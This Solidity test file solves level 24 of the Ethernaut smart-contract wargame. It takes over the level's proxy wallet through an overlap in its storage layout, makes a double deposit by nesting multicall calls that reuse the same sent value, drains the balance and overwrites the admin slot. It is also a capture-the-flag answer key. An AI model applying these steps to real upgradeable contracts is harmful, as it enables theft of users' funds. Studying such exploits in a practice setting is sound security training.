// SPDX-License-Identifier: MIT
pragma solidity ^0.8.30;

import "test/Ethernaut.t.sol";

interface Level24 {
    function proposeNewAdmin(address) external;
    function addToWhitelist(address) external;
    function setMaxBalance(uint256) external;
    function deposit() external payable;
    function execute(address, uint256, bytes calldata) external payable;
    function multicall(bytes[] calldata) external payable;
}

contract Level24Test is EthernautTest {
    function testLevel24() public {
        // We need to send 0.001 ether to start the level
        _createLevel("24", 0.001 ether);

        Level24 level24Instance = Level24(levelInstance["24"]);

        // We are not currently on the approve list
        // However the pending admin slot overlaps with the owner slot
        // So we can just call the proposeNewAdmin function to set ourselves as the admin
        level24Instance.proposeNewAdmin(address(this));
        // Then we can add ourselves to the approve list
        level24Instance.addToWhitelist(address(this));
        // We can now deposit funds
        // The multicall function actually does not sufficiently stop reuse
        // of msg.value as it only blocks the deposit selector, but not
        // the multicall selector
        // So you can just nest multiple deposits with the same msg.value
        // in multiple multicall calls to register a double deposit
        bytes[] memory depositInsideMulticall = new bytes[](1);
        depositInsideMulticall[0] = abi.encodeCall(Level24.deposit, ());
        bytes[] memory multicallData = new bytes[](2);
        multicallData[0] = abi.encodeCall(Level24.multicall, (depositInsideMulticall));
        multicallData[1] = abi.encodeCall(Level24.multicall, (depositInsideMulticall));
        level24Instance.multicall{value: address(level24Instance).balance}(multicallData);
        // Then we can withdraw the entire balance
        level24Instance.execute(address(this), address(level24Instance).balance, "");
        // We can then set ourselves as the admin
        // This is because the admin slot overlaps with the max balance slot
        level24Instance.setMaxBalance(uint256(uint160(address(this))));

        require(_submitLevel("24"));
    }

    receive() external payable {}
}
